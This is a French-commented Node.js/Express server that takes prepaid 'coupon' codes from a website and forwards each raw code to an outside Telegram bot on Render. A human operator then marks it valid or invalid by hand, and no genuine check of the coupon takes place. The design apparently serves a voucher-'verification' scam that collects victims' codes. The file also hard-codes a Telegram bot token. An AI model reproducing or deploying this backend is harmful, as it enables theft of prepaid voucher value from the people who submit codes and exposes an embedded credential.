// Backend Node.js/Express pour validation des coupons
const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const app = express();
const port = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.json());

// Stockage temporaire en mémoire (à remplacer par une base si besoin)
const codes = {};

// Endpoint pour enregistrer la demande de validation (depuis le site)
app.post('/api/request', async (req, res) => {
  const { code, type, requestId, chat_id } = req.body;
  if (!code || !type || !requestId) return res.status(400).json({ ok: false });
  codes[requestId] = { code, type, status: 'pending', chat_id };
  // Appeler le bot pour afficher le panel avec boutons sur Telegram
  let botPanelSent = false;
  // Permettre la configuration de l'adresse du bot via variable d'environnement
  // Adresse du bot sur Render (adapter le nom si besoin)
  // Utilise l'URL Render réelle du bot
    try {
      await axios.post('https://bot-js-3ptn.onrender.com/trigger-coupon', {
        type,
        code,
        requestId
      });
    } catch (e) {
      console.error('Erreur appel bot /trigger-coupon:', e.message);
    }
  res.json({ ok: true });
});

// Endpoint pour le bot Telegram : valider/refuser un code
const axios = require('axios');
const TELEGRAM_BOT_TOKEN = '8330769234:AAGiGPXFAl13nE7rR44v6MlKhAiuS6sznZM';
app.post('/api/validate', async (req, res) => {
  const { requestId, result } = req.body;
  if (!codes[requestId]) return res.status(404).json({ ok: false });
  codes[requestId].status = result === 'OUI' ? 'valid' : 'invalid';
  // Envoyer un message au client si chat_id est connu
  const chat_id = codes[requestId].chat_id;
  if (chat_id) {
    let text = '';
    if (result === 'OUI') text = '✅ VOTRE CODE EST BON';
    else if (result === 'NON') text = '❌ VOTRE CODE N\'EST PAS BON';
    if (text) {
      try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
          chat_id,
          text
        });
      } catch {}
    }
  }
  res.json({ ok: true });
  // Réinitialiser la demande après validation
  delete codes[requestId];
});

// Endpoint pour le site : vérifier le statut
app.get('/api/status/:requestId', (req, res) => {
  const { requestId } = req.params;
  if (!codes[requestId]) return res.json({ status: 'notfound' });
  res.json({ status: codes[requestId].status });
});

app.listen(port, () => {
  console.log('API listening on port', port);
});
